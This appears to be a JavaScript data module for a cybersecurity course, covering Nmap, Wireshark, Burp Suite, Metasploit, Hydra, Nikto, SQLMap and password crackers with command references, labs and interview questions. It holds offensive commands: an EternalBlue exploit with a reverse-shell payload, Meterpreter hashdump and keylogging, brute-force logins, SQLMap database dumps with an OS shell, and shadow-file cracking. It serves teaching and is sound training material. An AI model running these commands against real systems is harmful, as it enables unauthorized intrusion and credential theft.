const M5={title:'Cybersecurity Tools',topics:[
{title:'Nmap — Network Mapper',
def:'Nmap is the industry-standard open-source tool for host discovery, port scanning, service/version detection, OS fingerprinting, and vulnerability scanning.',
commands:cb('Nmap Complete Reference',`# INSTALLATION
sudo apt install nmap          # Kali/Debian (pre-installed on Kali)

# HOST DISCOVERY
nmap -sn 192.168.1.0/24        # Ping sweep — find live hosts
nmap -sn 192.168.1.0/24 -oG - | grep "Up"  # Grep live hosts

# PORT SCANNING
nmap 192.168.1.100             # Top 1000 TCP (default)
nmap -p- 192.168.1.100         # ALL 65535 ports (slow but complete)
nmap -p 22,80,443 192.168.1.100 # Specific ports

# SERVICE DETECTION
nmap -sV 192.168.1.100         # Service + version
nmap -sV -sC 192.168.1.100     # + run default NSE scripts
nmap -A 192.168.1.100          # Aggressive: OS+ver+scripts+traceroute

# SCAN TYPES
nmap -sS 192.168.1.100         # SYN scan (stealth, requires root)
nmap -sT 192.168.1.100         # TCP connect (no root needed)
nmap -sU 192.168.1.100         # UDP scan (slow)
nmap -sN 192.168.1.100         # Null scan (evasion)
nmap -Pn 192.168.1.100         # Skip ping (firewalled hosts)

# SPEED & TIMING
nmap -T4 192.168.1.100         # Faster (T0=paranoid → T5=insane)
nmap --min-rate 5000 192.168.1.100  # Min packets/sec

# NSE VULNERABILITY SCRIPTS
nmap --script vuln 192.168.1.100
nmap --script smb-vuln-ms17-010 192.168.1.100  # EternalBlue check
nmap --script http-title 192.168.1.100
nmap --script banner 192.168.1.100             # Grab banners
nmap --script ftp-anon 192.168.1.100           # Anonymous FTP

# OUTPUT
nmap -oN scan.txt 192.168.1.100    # Text output
nmap -oX scan.xml 192.168.1.100    # XML
nmap -oG scan.gnmap 192.168.1.100  # Grepable
nmap -oA scan 192.168.1.100        # All three formats

# RECOMMENDED FULL PENTEST SCAN
nmap -sV -sC -p- --min-rate 5000 -oA full_scan TARGET_IP`),
lab:'<div class="checklist"><h4>🔬 Nmap Lab Exercise</h4><label class="check-item"><input type="checkbox"> Set up Metasploitable 2 VM on Host-Only network</label><label class="check-item"><input type="checkbox"> Run: nmap -sn 192.168.56.0/24 (find Metasploitable IP)</label><label class="check-item"><input type="checkbox"> Run: nmap -sV -sC TARGET — document all services</label><label class="check-item"><input type="checkbox"> Run: nmap -A TARGET — compare with -sV output</label><label class="check-item"><input type="checkbox"> Run: nmap --script vuln TARGET — identify vulnerabilities</label><label class="check-item"><input type="checkbox"> Save output: nmap -oA metasploitable TARGET</label></div>',
interview:[{q:'What does nmap -sV do?',a:'Service version detection — identifies what software and version is running on each open port.'},{q:'What is the difference between -sS and -sT?',a:'-sS (SYN scan) sends SYN, gets response, never completes handshake — stealthier, requires root. -sT completes the full TCP connection — no root needed but more detectable.'}],
summary:'nmap -sV=versions | -sC=scripts | -A=aggressive | -sS=stealth | -p-=all ports. Full scan: nmap -sV -sC -p- --min-rate 5000 TARGET. --script vuln=automated vuln check.'},

{title:'Wireshark — Packet Analyser',
def:'Wireshark captures and interactively analyses network packets. Used for traffic analysis, credential hunting, malware C2 detection, and protocol debugging.',
commands:cb('Wireshark Filters & Workflow',`# INSTALLATION
sudo apt install wireshark    # Linux (pre-installed Kali)

# CAPTURE FILTERS (set before capturing)
port 80                       # Only HTTP
port 443                      # Only HTTPS
host 192.168.1.100            # Only this host
not arp and not dns           # Exclude noise

# DISPLAY FILTERS (apply after capture)
http                          # HTTP traffic
dns                           # DNS queries/responses
tcp.port == 22                # SSH
tcp.port == 3389              # RDP
ip.addr == 192.168.1.100      # Specific IP
ip.src == 10.0.0.1            # Source IP only
tcp.flags.syn == 1 and tcp.flags.ack == 0  # SYN scan detection
http.request.method == "POST" # Login attempts
frame contains "password"     # Find "password" anywhere
http.response.code == 200     # Successful HTTP responses

# KEY WORKFLOW
1. Select interface → Start capture
2. Apply display filter to reduce noise
3. Right-click packet → Follow → TCP Stream (see conversation)
4. File → Export Objects → HTTP (extract downloaded files)
5. Statistics → Protocol Hierarchy (protocol breakdown)
6. Statistics → Conversations (top talkers)
7. Analyze → Expert Information (warnings and errors)

# Security use cases:
→ Detect plaintext credentials (filter: http contains "password")
→ Find C2 beaconing (regular DNS/HTTP requests to unknown domains)
→ Detect ARP poisoning (Analyze → Expert Info → Warnings)
→ Extract malware samples (Export Objects → HTTP)`),
lab:'<div class="checklist"><h4>🔬 Wireshark Lab</h4><label class="check-item"><input type="checkbox"> Open Wireshark, start capture on your active interface</label><label class="check-item"><input type="checkbox"> Browse an HTTP (not HTTPS) website while capturing</label><label class="check-item"><input type="checkbox"> Apply display filter: http.request.method == "POST"</label><label class="check-item"><input type="checkbox"> Right-click a POST request → Follow TCP Stream</label><label class="check-item"><input type="checkbox"> Try filter: dns — observe all DNS queries your machine makes</label><label class="check-item"><input type="checkbox"> Try: Statistics → Protocol Hierarchy</label></div>',
interview:[{q:'What Wireshark feature lets you reconstruct a full TCP conversation?',a:'Follow → TCP Stream — reassembles all packets in a session and shows the full exchange as readable text.'},{q:'How would you find plaintext credentials in Wireshark?',a:'Apply filter: http.request.method == "POST" then Follow TCP Stream, or use: frame contains "password"'}],
summary:'Wireshark=packet capture/analysis. Display filters=key skill. Follow TCP Stream=see full sessions. Export Objects=extract files from traffic. Detects plaintext creds, C2, ARP poisoning.'},

{title:'Burp Suite — Web Security Platform',
def:'Burp Suite intercepts, analyses, and manipulates HTTP/HTTPS traffic between browser and server. The industry-standard tool for web application security testing.',
commands:cb('Burp Suite Setup & Modules',`# SETUP
1. Launch Burp Suite Community Edition
2. Proxy → Options → Proxy Listeners → 127.0.0.1:8080
3. Browser: set proxy to 127.0.0.1:8080
4. Burp → Proxy → Intercept → Install CA Certificate
5. Import CA cert in browser (Firefox: Settings → Certs)

# KEY MODULES
Proxy      → Intercept & modify HTTP requests/responses
Repeater   → Manually tweak and resend requests
Intruder   → Automated fuzzing and brute force
Decoder    → Encode/decode Base64, URL, HTML, hex
Comparer   → Diff two requests or responses
Sequencer  → Analyse token randomness
Scanner    → Automated vuln scan (Pro version only)

# COMMON WORKFLOWS

# 1. Test for SQLi manually in Repeater:
#    Send request to Repeater → add ' to parameter → check response

# 2. Brute force login with Intruder:
POST /login HTTP/1.1
user=admin&password=§password§    ← §marks§ = injection point
Intruder → Payloads → Simple List → rockyou.txt → Start Attack

# 3. Decode session token in Decoder:
#    Paste token → Decode as Base64

# 4. Test IDOR:
#    Change user_id=123 to user_id=124 in Repeater

# KEYBOARD SHORTCUTS
Ctrl+R → Send to Repeater
Ctrl+I → Send to Intruder
Ctrl+U → URL encode selection`),
lab:'<div class="checklist"><h4>🔬 Burp Suite Lab (DVWA)</h4><label class="check-item"><input type="checkbox"> Set up DVWA locally or use TryHackMe Burp room</label><label class="check-item"><input type="checkbox"> Configure browser proxy to 127.0.0.1:8080</label><label class="check-item"><input type="checkbox"> Intercept a login request — view the POST body</label><label class="check-item"><input type="checkbox"> Send the request to Repeater — modify username</label><label class="check-item"><input type="checkbox"> Send to Intruder — brute force password field with rockyou.txt</label><label class="check-item"><input type="checkbox"> Use Decoder to base64 encode/decode a string</label></div>',
interview:[{q:'What is Burp Suite Repeater used for?',a:'Manually resending and modifying HTTP requests to test different inputs without resubmitting forms in the browser — essential for manual SQLi, XSS, IDOR testing.'},{q:'What is Burp Suite Intruder used for?',a:'Automated customised attacks — brute forcing, fuzzing parameters, testing all payloads from a wordlist against a specific injection point.'}],
summary:'Burp=HTTP interception+manipulation. Proxy=intercept | Repeater=manual test | Intruder=brute force | Decoder=encode/decode. Setup: browser proxy→127.0.0.1:8080+CA cert.'},

{title:'Metasploit Framework',
def:'Metasploit is the most widely-used open-source penetration testing framework, providing tools to develop, test, and execute exploits against real-world systems.',
commands:cb('Metasploit Complete Workflow',`# LAUNCH
msfconsole
msfdb init                         # Initialise database

# DATABASE INTEGRATION
db_nmap -sV 192.168.1.100         # Nmap scan stored in MSF DB
hosts                              # List discovered hosts
services                           # List discovered services
vulns                              # List found vulnerabilities

# FINDING MODULES
search ms17_010                    # Search by keyword/CVE
search type:exploit platform:linux
use exploit/windows/smb/ms17_010_eternalblue

# MODULE WORKFLOW
info                               # Module information
show options                       # Required/optional params
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10             # Your IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                              # Check if target vulnerable (if supported)
run                                # Execute exploit

# METERPRETER COMMANDS
sysinfo | getuid | getpid
getsystem                          # Attempt privilege escalation
hashdump                           # Dump NTLM hashes
shell                              # OS shell
ps                                 # Running processes
migrate PID                        # Migrate to another process
keyscan_start / keyscan_dump       # Keylogging
screenshot                         # Take screenshot
download /etc/passwd .             # Download file
upload linpeas.sh /tmp/            # Upload file
portfwd add -l 8080 -r 192.168.1.200 -p 80  # Port forward
run post/multi/recon/local_exploit_suggester  # Privesc suggester
run post/linux/gather/hashdump     # Linux hash dump

# LISTENERS (handler)
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j                             # Run as background job`),
interview:[{q:'What is the Metasploit module hierarchy?',a:'Exploit (takes advantage of vulnerability) → Payload (code that runs after exploit: Meterpreter, shell) → Post (post-exploitation modules like hashdump, privesc).'},{q:'What is getsystem in Meterpreter?',a:'A command that attempts several privilege escalation techniques to gain SYSTEM-level access on Windows.'}],
summary:'msfconsole=launch | search+use+set+run=core workflow. Meterpreter=advanced in-memory shell. getsystem=privesc. hashdump=extract Windows password hashes. use multi/handler for reverse shells.'},

{title:'Hydra — Login Brute Forcer',
def:'Hydra is a parallelised login cracker supporting 50+ protocols (SSH, FTP, HTTP, SMB, RDP) for brute force and dictionary attacks.',
commands:cb('Hydra Attack Examples',`# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.100  # 4 threads

# FTP brute force
hydra -L users.txt -P rockyou.txt ftp://192.168.1.100

# RDP brute force
hydra -l administrator -P rockyou.txt rdp://192.168.1.100

# HTTP POST form (web login)
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
"/login:username=^USER^&password=^PASS^:Invalid credentials"
# ^USER^ and ^PASS^ = injection markers
# "Invalid credentials" = failure string

# HTTP GET basic auth
hydra -l admin -P rockyou.txt 192.168.1.100 http-get /admin

# SMB
hydra -l administrator -P rockyou.txt smb://192.168.1.100

# Multiple targets
hydra -l admin -P rockyou.txt -M targets.txt ssh

# KEY OPTIONS
-l username        Single username
-L file            Username list
-p password        Single password
-P file            Password wordlist
-t 16              Threads (default 16)
-V                 Verbose: show each attempt
-f                 Stop after first found pair
-o output.txt      Save results
-s PORT            Specify non-default port
-w 30              Wait 30 sec between retries (avoid lockout)`),
interview:[{q:'What is the difference between brute force and dictionary attack?',a:'Brute force tries every possible character combination. Dictionary attack uses a list of likely passwords (wordlist). Dictionary attacks are faster and more practical.'},{q:'How do you avoid account lockout during a brute force attack?',a:'Reduce thread count (-t 1), add delays (-w flag), use password spraying (one password across many accounts) instead of brute force.'}],
summary:'Hydra=multi-protocol login cracker. ^USER^/^PASS^=markers for HTTP forms. rockyou.txt=primary wordlist. -t=threads | -f=stop on success | -V=verbose. Always stay within scope.'},

{title:'Nikto — Web Scanner',
def:'Nikto scans web servers for 6,700+ dangerous files, outdated software, misconfigurations, and common security issues.',
commands:cb('Nikto Usage',`# Basic scan
nikto -h http://192.168.1.100
nikto -h https://192.168.1.100 -ssl

# Specific port
nikto -h http://192.168.1.100:8080

# Save output
nikto -h http://192.168.1.100 -o report.html -Format html
nikto -h http://192.168.1.100 -o report.txt  -Format txt

# Scan through Burp proxy
nikto -h http://192.168.1.100 -useproxy http://127.0.0.1:8080

# Specific tuning (vulnerability categories)
nikto -h http://192.168.1.100 -Tuning 9   # SQL injection
nikto -h http://192.168.1.100 -Tuning b   # Software identification

# What Nikto finds:
→ Server version disclosure (Apache 2.4.49 → CVE-2021-41773)
→ Default files: /admin/, /phpinfo.php, /test.php
→ Missing security headers (X-Frame-Options, CSP)
→ Dangerous HTTP methods (PUT, DELETE, TRACE)
→ Outdated software versions
→ Session cookie flags (missing HttpOnly, Secure)
→ Directory listings enabled`),
interview:[{q:'What is Nikto used for?',a:'Automated web server scanning — finds misconfigurations, outdated software, dangerous default files, and missing security headers. Good for quick recon.'},{q:'What is a limitation of Nikto?',a:'It is very noisy (easily detected) and generates many false positives. It is a starting point, not a definitive scanner.'}],
summary:'Nikto=web server vuln scanner. Finds: default files, old software, missing headers, dangerous methods. Noisy — easily detected by WAF/IDS. Good first-pass, not authoritative.'},

{title:'SQLMap — SQL Injection Automator',
def:'SQLMap automates detection and exploitation of SQL injection vulnerabilities, supporting extraction, privilege escalation, and OS command execution.',
commands:cb('SQLMap Usage',`# Basic detection
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login" --data "user=admin&pass=test"

# From Burp Suite saved request
sqlmap -r burp_request.txt

# Enumerate databases
sqlmap -u "http://target.com/?id=1" --dbs

# Enumerate tables in specific database
sqlmap -u "http://target.com/?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "http://target.com/?id=1" -D dbname -T users --dump

# Dump all
sqlmap -u "http://target.com/?id=1" --dump-all

# Get OS shell (if DB user has FILE privilege)
sqlmap -u "http://target.com/?id=1" --os-shell

# KEY OPTIONS
--level=5         More aggressive payload testing
--risk=3          Include higher risk tests
--batch           Non-interactive (auto yes)
--random-agent    Randomise User-Agent header
--tor             Route through Tor
--delay=2         2 second delay between requests
--threads=5       Parallel threads
--cookie="PHPSESSID=abc123"  # Include session cookie
--forms           Auto-detect and test HTML forms`),
interview:[{q:'How would you use SQLMap with a POST request?',a:'sqlmap -u "URL" --data "param1=val1&param2=val2" — or save the Burp request to a file and use sqlmap -r request.txt'},{q:'What does SQLMap --os-shell do?',a:'If the database user has FILE privilege (MySQL root), SQLMap can write a web shell and provide an OS command execution interface.'}],
summary:'SQLMap=automated SQLi detection+exploitation. -r=from file (Burp) | --dbs=list databases | -D/-T=specific DB/table | --dump=extract data | --os-shell=command execution.'},

{title:'John the Ripper & Hashcat',
def:'John the Ripper (CPU) and Hashcat (GPU) are password cracking tools using dictionary attacks, brute force, and rule-based mangling to recover plaintext from hashes.',
commands:cb('Password Cracking Reference',`# IDENTIFY HASH TYPE FIRST
hash-identifier <hash>
hashid <hash>
# Or check: https://hashes.com/en/tools/hash_identifier

# JOHN THE RIPPER (CPU-based)
john hashes.txt                              # Auto-detect + crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=md5 --wordlist=rockyou.txt hashes.txt
john --format=bcrypt hashes.txt
john --show hashes.txt                       # Show cracked

# Crack Linux shadow file
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt

# Crack ZIP password
zip2john protected.zip > zip.hash && john zip.hash

# Crack SSH private key passphrase
ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=rockyou.txt

# HASHCAT (GPU-based — much faster)
# Hash modes: -m 0=MD5, -m 100=SHA1, -m 1000=NTLM, -m 3200=bcrypt

hashcat -m 0    hash.txt rockyou.txt         # MD5 dictionary
hashcat -m 1000 hash.txt rockyou.txt         # Windows NTLM
hashcat -m 3200 hash.txt rockyou.txt         # bcrypt (slow!)

# Brute force (mask attack)
hashcat -m 0 hash.txt -a 3 ?a?a?a?a?a?a    # 6 char all types
# ?l=lowercase ?u=uppercase ?d=digits ?a=all ?s=symbols

# Hybrid: wordlist + rules
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common hash examples:
# MD5:    5f4dcc3b5aa765d61d8327deb882cf99  (password)
# NTLM:   8846f7eaee8fb117ad06bdd830b7586c  (password)
# bcrypt: $2b$12$...`),
interview:[{q:'What is the difference between John and Hashcat?',a:'John the Ripper uses CPU — slower but more versatile. Hashcat uses GPU — dramatically faster for large wordlists and brute force attacks.'},{q:'What is a rainbow table attack?',a:'Uses precomputed hash→plaintext lookup tables for instant cracking. Defeated by salting — adding a random string to the password before hashing.'}],
summary:'John=CPU cracker | Hashcat=GPU cracker (faster). rockyou.txt=primary wordlist. MD5/SHA1=insecure | bcrypt/Argon2=use for passwords. Salt defeats rainbow tables.'}
]};
